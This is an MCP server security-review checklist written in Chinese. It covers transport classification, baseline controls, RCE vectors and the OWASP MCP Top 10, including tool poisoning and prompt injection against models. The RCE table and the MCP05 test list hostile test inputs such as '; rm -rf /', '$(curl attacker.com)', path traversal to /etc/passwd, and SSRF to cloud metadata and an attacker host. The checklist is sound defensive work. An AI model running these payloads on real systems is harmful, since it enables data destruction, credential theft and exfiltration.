# MCP 實作安全性審查

## 流程

### 步驟 1 — 分類目標
- 檢查 **MCP 協定版本 [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26) 或更新版本**（目前為：[2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25)）。將較舊的版本標記為發現事項，但繼續審查。
- 確定目標是**伺服器**還是**用戶端**。
- 使用下方的傳輸參考資料，將傳輸分類為**網路暴露**或**僅限本機**。
- 記錄傳輸、協定版本以及是否存在工作階段。

**完成標準：** 已辨識出目標類型、協定狀態和傳輸方式。

### 步驟 2 — 過濾偽陽性
- 在提出發現事項之前，套用**偽陽性過濾器**。
- 僅在文件描述存放庫自身的伺服器行為、部署、傳輸或驗證狀態時保留該文件。
- 對於框架/SDK 存放庫，將審查範圍限制在**預設組態**和**公開 API 介面**。

**完成標準：** 剩餘的辨識依據均為範圍內程式碼、存放庫自有的文件或公開 API 行為。

### 步驟 3 — 檢查基準控制措施
- 對於**網路暴露的伺服器**，檢查 **MCP-01** 到 **MCP-05**。
- 對於**本機/STDIO 伺服器**，請勿將基準控制措施標記為通過/失敗；提供最佳實務說明並繼續進行 RCE 審查。
- 對於**用戶端**，僅審查用戶端程式碼中明確可見的權杖/工作階段處理；除非使用者要求進行用戶端風險審查，否則請勿套用伺服器基準。

**完成標準：** 每個適用的控制措施都有支援的狀態。

### 步驟 4 — 檢查 RCE 向量
- Review all 7 RCE vectors.
- 將每個向量標記為**安全**、**有風險**或**不適用**。
- 偏好直接的辨識依據，而非推論；下方的 RCE 向量表列出了要尋找的模式。

**完成標準：** 每個相關工具都有 RCE 結果或明確的不適用。

### 步驟 5 — 檢查 OWASP MCP Top 10
- 評估下方的所有 10 個 OWASP 風險。
- 如果步驟 3 的控制措施已經完全涵蓋了某個 OWASP 風險，請引用該結果，而不是重新檢查。
- 對於本機/STDIO 伺服器，將相依於網路的 OWASP 風險（MCP07、MCP09）標記為不適用。
- 將每個風險標記為通過、失敗或需要調查。

**完成標準：** 所有 10 個 OWASP 風險都有由可觀察的辨識依據支援的結果，或是從步驟 3 引用的結果。

### 步驟 6 — 報告
- 使用下方的**合規性輸出格式**。
- 在每個理據中包含檔案/行號參考。
- 將程式碼發現事項與手動後續追蹤分開。
- 如果辨識依據不完整，請使用**需要調查**並指出遺漏的產出物。

**完成標準：** 報告包含控制措施、RCE、選用的 OWASP 和動作。

## 參考資料

### 決策規則
- **網路暴露的伺服器：** 套用**所有 5 個控制措施**，然後執行 RCE 和要求的 OWASP 檢查。
- **本機/STDIO 伺服器：** 僅針對 5 個控制措施提供**最佳實務指引**；仍要執行 RCE 檢查，因為工具輸入可能會在本機執行。
- **用戶端：** 審查已接收權杖的處理，以及拒絕信任伺服器提供的工作階段 ID；除非收到要求，否則不強制執行伺服器控制措施。
- **反向代理或容器暴露：** 如果流量可以透過網路連入伺服器，即使內部繫結為 localhost，也將其視為**網路暴露**。
- **辨識依據不明確：** 請勿猜測。標記為**需要調查**並說明必須手動驗證的內容。
- **驗證涵蓋範圍模糊：** 存在驗證中介軟體，但不明確其是否涵蓋 MCP 端點 → 標記為**需要調查**。
- **無法確定的傳輸：** 如果無法從程式碼確定傳輸方式，請標記以進行手動審查，且**不要**假設為 STDIO — 預設為 STDIO 會錯誤地略過伺服器控制措施。

### 傳輸分類

**網路暴露（強制執行所有控制措施）：**

| 模式 | 傳輸方式 |
|---|---|
| `transport="http"` 或 `transport="sse"` | HTTP/SSE |
| `StreamableHttpServerTransport` | HTTP (TS/JS) |
| `SSEServerTransport` | SSE (TS/JS) |
| `WithHttpTransport()` | HTTP (C#) |
| `host="0.0.0.0"` | 所有介面繫結 |
| 包含 MCP 路由的 Express `.listen(port)` | HTTP (預設 `0.0.0.0`) |
| Dockerfile 中的 `EXPOSE` + MCP 伺服器 | 網路暴露 |

**僅限本機（僅限最佳實務）：**

| 模式 | 傳輸方式 |
|---|---|
| `StdioServerTransport` | STDIO (TS/JS) |
| `WithStdioServerTransport()` | STDIO (C#) |
| `transport="stdio"` | STDIO |
| 無引數的 `mcp.run()` (Python FastMCP) | 預設 STDIO |
| 具有 `command` 金鑰且無 URL 的 `.vscode/mcp.json` | STDIO 子程序 |

**主機繫結陷阱：**

| 繫結 | 實際暴露情況 |
|---|---|
| `host="0.0.0.0"` | 🔴 網路暴露 |
| `host="127.0.0.1"` 或 `localhost` | 🟢 僅限本機 |
| 未指定明確主機 (Express/Node) | 🔴 預設為 `0.0.0.0` |
| 未指定明確主機 (Python FastMCP) | 🟡 取決於傳輸方式 — 需驗證 |
| Docker `ports: "8000:8000"` | 🔴 即使程序在容器內繫結 `127.0.0.1` 也是網路暴露 |

### 偽陽性過濾器

| 偽陽性模式 | 如何偵測 |
|---|---|
| `.github/skills/` 範本 | 路徑包含 `.github/skills/` — 技能範本，而非伺服器程式碼 |
| 供應商提供的 SDK / OSS 複本 | 檔案定義了 `class FastMCP`、`class McpServer`，或路徑在 `node_modules/`、`vendor/` 中 |
| MCP 用戶端組態 | 具有 `inputs`/`servers` 但無伺服器程式碼的 `.vscode/mcp.json` |
| 文件 / 教學 | 具有與存放庫自身伺服器無關之程式碼區塊的 `.md`、`.rst` |
| 僅限輸出驗證程式庫 | 僅用於輸出驗證的 `DefaultAzureCredential`、服務帳戶 JSON 或類似物件 |

描述存放庫**自身**伺服器行為、傳輸方式、驗證狀態或部署的文件**不是**偽陽性。

## 控制措施參考

### MCP-01 — 身分隔離
**範圍：** 遠端 MCP 伺服器

**條件**
- 使用受信任的身分識別提供者驗證每個連入要求，並在伺服器界限處強制執行授權；不要從工作階段 ID、先前的要求或網路位置推論驗證。
- 使用**唯一的伺服器專用應用程式身分**和對象/資源識別碼；輸出呼叫在需要時使用獨立範圍的服務認證或代表流程，絕不使用連入權杖。
- 僅允許用於僅限元資料的 OAuth/MCP 啟動程序之未驗證偵測端點：`/.well-known/oauth-protected-resource`、`/.well-known/oauth-authorization-server`、`/.well-known/openid-configuration`。

**要檢查的內容**
- 權杖驗證和授權中介軟體在每個 MCP 路由上執行；如果存在，授權應區分工具呼叫、唯讀和管理作業。
- 身分組態顯示專用的應用程式/用戶端/資源 ID 和對象；輸出用戶端取得其自身的權杖，且絕不複製連入的 `Authorization`。
- 偵測端點僅傳回元資料，且無法執行工具或公開受保護的資料。

**關鍵陷阱：** 共用的應用程式身分或轉送的主叫方權杖會破壞身分隔離，並建立混淆代理人路徑。

### MCP-02 — 工作階段
**範圍：** 支援工作階段的遠端 MCP 伺服器

**適用性**
- 未發行或使用任何工作階段識別碼 → 標記為 **不適用**（仍需要逐次要求驗證；請參閱 MCP-01）。
- 工作階段由傳輸方式/SDK 管理（例如，串流 HTTP `Mcp-Session-Id`），但產生/繫結在原始碼中不可見 → 標記為 **需要調查**，而非失敗。
- 程式碼中存在工作階段識別碼 → 對照下列條件評分 **通過/失敗**。

**條件**
- 驗證並授權**每個**要求；工作階段狀態絕不替代權杖驗證。
- 工作階段 ID 僅為不透明的相互關係/連續性權杖；它們不授予權限、編碼授權或略過驗證。
- 工作階段 ID 是由 CSPRNG 產生、不可預測、繫結至已驗證的內容，且絕不內嵌在 URL 中。

**要檢查的內容**
- 中介軟體會驗證每個要求（而非僅在工作階段開始時）的權杖。
- 授權邏輯絕不單逐信任工作階段 ID；遺失或重複使用工作階段 ID 絕不能授予存取權限。
- 工作階段建立使用隨機 ID（可接受 GUID v4/CSPRNG；不接受循序或基於時間的 ID）。

**關鍵陷阱：** 將工作階段 ID 視為載體認證會使相互關係權杖變成驗證。

### MCP-03 — 速率限制
**範圍：** MCP 伺服器與工具

**條件**
- 對工具偵測和工具呼叫強制執行速率限制和濫用防護。
- **在 MCP 伺服器執行階段**（而非僅在閘道處）強制執行限制；依已驗證的身分以及存在工作階段時的工作階段進行分割。
- 對具有變更能力和高成本的工具套用更嚴格的限制；超出限制時，以 **HTTP 429** 和 **Retry-After** 失敗關閉，且不執行該工具。

**要檢查的內容**
- 伺服器程式碼中（而非僅在輸入或代理組態中）的偵測和呼叫端點上存在速率限制中介軟體或等效項目。
- 限制以身分和工作階段為鍵值，對寫入/高成本作業有更嚴格的預算。
- 超出限制的要求在進行後端動作之前停止，並傳回包含 Retry-After 的 429。

**起始臨界值**（根據實際負載、下游限制和成本進行微調）：

| 工具類型 | 每個身分 | 每個工作階段 | 說明 |
|---|---|---|---|
| 唯讀 / 列出 | 100/分鐘 | 200/分鐘 | 如果下游 API 敏感，則調低 |
| 變更 / 寫入 | 10/分鐘 | 20/分鐘 | 對狀態變更作業更嚴格 |
| 高成本運算 | 5/分鐘 | 10/分鐘 | 成本加權；注意雲端花費 |
| 工具偵測 | 30/分鐘 | 60/分鐘 | 防止列舉濫用 |

**關鍵陷阱：** 僅限閘道的節流或單一扁平值儲存貯體會留下繞過空間，且對昂貴工具保護不足。

### MCP-04 — Schema 驗證
**範圍：** 公開具有結構化引數之工具的 MCP 伺服器

**條件**
- **在執行之前**對照明確的 Schema 驗證**所有**工具引數。
- Schema 定義類型、必要欄位、列舉和邊界，並預設拒絕未指定的屬性（`additionalProperties: false` 或等效項目）。
- 驗證在每次呼叫的伺服器端執行；無效輸入會因 400/MCP 錯誤而失敗關閉，且不執行後端動作。

**要檢查的內容**
- 每個工具描述器都有一個涵蓋類型、必要欄位、列舉、邊界和屬性限制的 Schema。
- 驗證發生在每次呼叫的伺服器界限處，而非僅在用戶端、閘道或下游服務中。
- 負面測試會拒絕格式錯誤的輸入、額外屬性和邊界違規。

**關鍵陷阱：** 允許額外屬性或僅限用戶端的驗證會建立隱藏的攻擊表面和範圍蔓延。

### MCP-05 — SDK 優先
**範圍：** 遠端 MCP 伺服器

**條件**
- 使用您伺服器語言的**官方 MCP SDK** 建置遠端 MCP 伺服器：
  - **第一層（完全支援）：** TypeScript (modelcontextprotocol/typescript-sdk), Python (modelcontextprotocol/python-sdk), C#/.NET (modelcontextprotocol/csharp-sdk), Go (modelcontextprotocol/go-sdk)
  - **第二/三層（開發中）：** Java (modelcontextprotocol/java-sdk), Kotlin (modelcontextprotocol/kotlin-sdk), Rust (modelcontextprotocol/rust-sdk), Swift (modelcontextprotocol/swift-sdk), PHP (modelcontextprotocol/php-sdk), Ruby (modelcontextprotocol/ruby-sdk)
- 如果未使用官方 SDK，將 MCP-05 標記為 需要調查。
- 保持 SDK 最新且已修補，並驗證哪些控制措施是自動的，哪些是手動的。

**要檢查的內容**
- 相依性參考官方 MCP SDK，而非手動編寫的 HTTP/SSE 堆疊。
- 如果未使用 SDK，存放庫包含驗證/授權、工作階段、速率限制和 Schema 驗證的直接辨識依據。
- 相依性鎖定和更新維護顯示 SDK 已得到維護。

**關鍵陷阱：** 手動編寫的伺服器通常會遺漏一個「小」原語 — 逐次要求驗證、節流或驗證 — 並且這些差距會疊加。

## RCE 向量

| 向量 | 危險程式碼 | 安全替代方案 | 測試承載 | CWE |
|---|---|---|---|---|
| 命令注入 | `exec("convert " + args.filename)`, `os.system(f"process {user_input}")`, `Process.Start("cmd", "/c " + toolArg)` | `execFile("convert", [args.filename])`, `subprocess.run(["process", user_input], shell=False)` | `; rm -rf /`, `$(curl attacker.com)`, `| net user` 必須被拒絕或視為常值處理 | CWE-78 |
| 動態程式碼評估 | `eval(args.expression)`, `exec(tool_output)`, `new Function(args.code)()` | 沙箱化剖析器、基於 AST 的評估或預先定義的允許清單 | `__import__('os').system('whoami')`, `require('child_process').exec('id')` 必須被拒絕 | CWE-94, CWE-95 |
| 不安全的反序列化 | `pickle.loads(user_data)`, `yaml.load(input, Loader=yaml.UnsafeLoader)`, `BinaryFormatter.Deserialize(stream)` | `yaml.safe_load()`, 搭配 Schema 驗證的 `JSON.parse()`；避免對未受信任的輸入使用二進位格式 | 經設計的序列化承載必須被拒絕或安全處理 | CWE-502 |
| 路徑走訪 | 無驗證的 `fs.readFile(args.path)`, `open(user_path, 'w')` | 在讀取/寫入/執行之前，規範化並強制執行允許清單的基底目錄 | `../../../../etc/passwd`, `C:\Windows\System32\config\SAM`, `..\..\..\.env` 必須被拒絕 | CWE-22 |
| SSTI | `Template(user_input).render()`, `Handlebars.compile(args.template)({data})` | 絕不將使用者輸入用作範本來源；僅使用帶有參數的預先定義範本 | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` 絕不能轉譯為 `49` | CWE-1336 |
| 相依性綁架 | 未鎖定的相依性，例如 `"lodash": "^4.0.0"`；可從公用登錄中解析的內部套件名稱 | 鎖定確切版本，保留帶有完整性雜湊的鎖定檔案，使用受信任/有範圍的登錄，在可用時驗證簽章 | `npm audit`, `pip audit` 或 `dotnet list package --vulnerable`；審查 CVE 和可疑套件 | CWE-829 |
| SSRF | `requests.get(user_param)`, `fetch(user_input)`, `HttpClient.GetAsync(user_input)` | 允許清單配置協定/網域，封鎖 RFC1918 和本機連結目標，在傳送前驗證 URL | `http://169.254.169.254/latest/meta-data/`, `http://localhost:8080/admin`, `http://attacker.com/?data=stolen` 必須被拒絕 | CWE-918 |

## OWASP MCP Top 10

**MCP01:2025 — 權杖管理不當與秘密曝光**
測試：搜尋硬編碼的秘密和權杖記錄；驗證秘密來自環境變數或秘密管理員；驗證短期/輪替權杖。
通過：無硬編碼的秘密、敏感欄位已被遮蔽、使用短期/輪替權杖。失敗：硬編碼的秘密、權杖記錄，或無輪替的長期權杖。

**MCP02:2025 — 透過範圍擴張進行權限提升**
測試：審查範圍/角色；確認最小權限與逐次要求授權；除非有合理理由，否則拒絕萬用字元管理範圍；檢查執行階段功能擴充。
通過：最小權限範圍、逐次要求授權、無執行階段功能擴充。失敗：廣泛的範圍、僅限一次性驗證，或自我提升功能的工具。

**MCP03:2025 — 工具中毒**
測試：檢查工具定義是否為靜態且受伺服器控制、工具是否可以更改元資料，以及輸出是否包含 LLM 可剖析的指示。
通過：靜態的伺服器控制定義以及僅限資料的輸出。失敗：外部元資料來源或包含內嵌指示的輸出。

**MCP04:2025 — 供應鏈攻擊與相依性竄改**
測試：檢查鎖定檔案、精確鎖定、可疑的 `postinstall` 指令碼、相依性稽核結果以及受信任的登錄。
通過：鎖定相依性、提交鎖定檔案、無已知弱點、無可疑的安裝後指令碼。失敗：未鎖定相依性、無鎖定檔案、未修補的 CVE 或未受信任的登錄。

**MCP05:2025 — 命令注入與執行**
測試：搜尋命令列執行 API 和字串建立的命令；追蹤工具輸入是否到達命令列執行；測試 `; ls`、`$(whoami)`、`| cat /etc/passwd`。
通過：無來自未受信任輸入的命令列執行，或僅限允許清單的參數化執行。失敗：使用者輸入到達命令列，`shell=True` 搭配格式化字串，或不安全的串接。

**MCP06:2025 — 透過關聯承載進行提示注入**
測試：檢查工具輸出是否返回給 LLM、外部內容是否被清理/截斷/沙箱化，以及鏈結工具呼叫是否受到保護；測試包含敵對指示的輸出。
通過：工具輸出為資料、未受信任內容被清理/截斷/沙箱化，且鏈結有安全防護欄。失敗：原始外部內容返回給模型，且沒有鏈結限制。

**MCP07:2025 — 驗證與授權不足**
測試：傳送無驗證以及權杖已過期/無效的要求；驗證各工具的授權；確認驗證是在伺服器端強制執行，而非僅在閘道處。
通過：所有端點皆需要有效驗證、存在各工具 of 授權，且在伺服器端強制執行。失敗：任何未經驗證的存取、遺漏各工具的授權，或僅限閘道的強制執行。

**MCP08:2025 — 稽核與遙測不足**
測試：呼叫工具並確認記錄能擷取主叫方身分、工具名稱和時間戳記；觸發錯誤並確認提供有用的內容；驗證集中式記錄與警示。
通過：工具呼叫記錄有身分、記錄已集中，且存在警示。失敗：遺漏記錄、無主叫方身分、僅限本機的記錄，或無警示。

**MCP09:2025 — 影子 MCP 伺服器**
測試：驗證伺服器存在於服務清冊中；檢查未記載的 MCP 端點或暴露的非標準連接埠；檢查開發/預備環境隔離情況；驗證擁有者和審查軌跡。
通過：所有伺服器均已登入清冊、進行適當隔離且有擁有者。失敗：未記載的伺服器、開發/測試環境暴露到生產網路，或無擁有權。

**MCP10:2025 — 關聯注入與過度分享**
測試：檢查工具回應以實現資料最小化；在僅需要子集時檢查是否有 PII 或完整物件；驗證關聯隔離。
通過：傳回最少資料、屏蔽/排除敏感欄位，且隔離關聯。失敗：不必要地傳回完整物件、PII 暴露，或跨使用者共用關聯。

## 例外流程
- **記錄差距：** 辨識未滿足的控制措施、確切的偏差、殘留風險以及任何補償控制措施。
- **取得明確核准：** 將例外狀況呈報安全性/發佈核准流程，並指定擁有者和到期日或審查日期。
- **追蹤並重新評估：** 記錄核准的例外狀況與合規性結果，並在到期時或伺服器、工具、流量設定檔或暴露情況變更時重新評估。
